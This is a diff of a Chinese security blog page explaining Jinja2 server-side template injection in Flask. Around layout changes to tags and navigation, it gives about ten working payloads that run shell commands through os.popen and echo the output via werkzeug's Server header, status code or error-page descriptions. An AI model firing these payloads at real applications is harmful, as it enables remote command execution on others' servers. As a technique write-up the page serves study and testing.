@@ -396,12 +396,12 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SSTI/">
-                                <span class="chip bg-color">SSTI</span>
-                            </a>
-                        
                             <a href="/tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/tags/SSTI/">
+                                <span class="chip bg-color">SSTI</span>
                             </a>
                         
                     </div>
@@ -476,7 +476,7 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
 <p>这个利用方式比较新，据说只要是打jaijia2的ssti应该都能打。</p>
 <p>我们先看看回包的结构：</p>
 <p><img src="/img/loading.gif" data-original="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745469263731-cc4b17de-49e1-40a5-a15f-80503c522f99.png"><br>注意这里的Serverr，Data回显,对于原出题人的说法是在flask中存在一个Server头：</p>
-<p><img src="/img/loading.gif" data-original="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/745470661475-190d97c2-baac-4dcc-9d22-1d6fda36904b.png"></p>
+<p><img src="/img/loading.gif" data-original="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745470661475-190d97c2-baac-4dcc-9d22-1d6fda36904b.png"></p>
 <p>然后这个sever头有两个部分server_version和sys_version：	</p>
 <p><img src="/img/loading.gif" data-original="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745470686196-2d1e7446-111d-4606-83f4-dca594425120.png"></p>
 <p>这两个值是WSGIRequestHandler类中的属性，这里可以更改环境中的server_version或者sys_version的值来获取回显。</p>
@@ -493,34 +493,44 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
 <p>现在已经知道了对象，那么怎么获取到对象呢，即怎么获取到werkzeug.serving.WSGIRequestHandler对象，在这里我们可以通过使利用sys模块来获取到相关对象，</p>
 <p>就是通过sys模块来获取到相关类，在原型链污染中学习了如何获取到sys模块，所以payload如下：</p>
 <pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>同样的还可以利用这个sys_version，只不过这里是直接调用的类的属性：</p>
 <p>像server_version一样的“调用方法”。所以payload如下：</p>
 <pre><code>{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}
+
 </code></pre>
 <p>获取sys模块不只这种，同样的还存在于全局变量中，所以其实直接获取即可，如下payload：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <p>参考文章的payload如下：</p>
 <pre><code>{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}
+
 </code></pre>
 <h1 id="响应头扩展"><a href="#响应头扩展" class="headerlink" title="响应头扩展"></a>响应头扩展</h1><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"request_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <p>回显的HTTP/1.1，并且是str类型，所以应该是可以如下利用的：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <h1 id="错误页面回显"><a href="#错误页面回显" class="headerlink" title="错误页面回显"></a>错误页面回显</h1><p>比如方法错误的回显，或者500页面的回显：</p>
 <p>状态码回显</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.wrappers.Response,"default_status",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <p>改404页面的（先传payload再人为构造错误页面）：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.NotFound,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <p>405的：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.MethodNotAllowed,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 <p>500的：</p>
 <pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}
+
 </code></pre>
 
                 
@@ -586,12 +596,12 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SSTI/">
-                                    <span class="chip bg-color">SSTI</span>
-                                </a>
-                            
                                 <a href="/tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="/tags/SSTI/">
+                                    <span class="chip bg-color">SSTI</span>
                                 </a>
                             
                         </div>
@@ -664,64 +674,9 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
-            <div class="card">
-                <a href="/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/img/loading.gif" data-original="/medias/featureimages/22.jpg" class="responsive-img" alt="Jinjia2-SSTI请求头回显">
-                        
-                        <span class="card-title">Jinjia2-SSTI请求头回显</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/ssti/" class="post-category">
-                                    ssti
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/SSTI/">
-                        <span class="chip bg-color">SSTI</span>
-                    </a>
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
                 <a href="/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
@@ -739,9 +694,9 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -757,12 +712,65 @@ Server回显一直听Mash1r0.师傅讲请求头回显，第五届封神台也是
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
                     <a href="/tags/Web/">
                         <span class="chip bg-color">Web</span>
                     </a>
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/04/29/%E5%85%B3%E4%BA%8Enodejs%20mysql%20module%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/18.jpg" class="responsive-img" alt="关于nodejs mysql module导致的登陆漏洞">
+                        
+                        <span class="card-title">关于nodejs mysql module导致的登陆漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/nodejs/" class="post-category">
+                                    nodejs
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/nodejs/">
+                        <span class="chip bg-color">nodejs</span>
                     </a>
                     
                 </div>
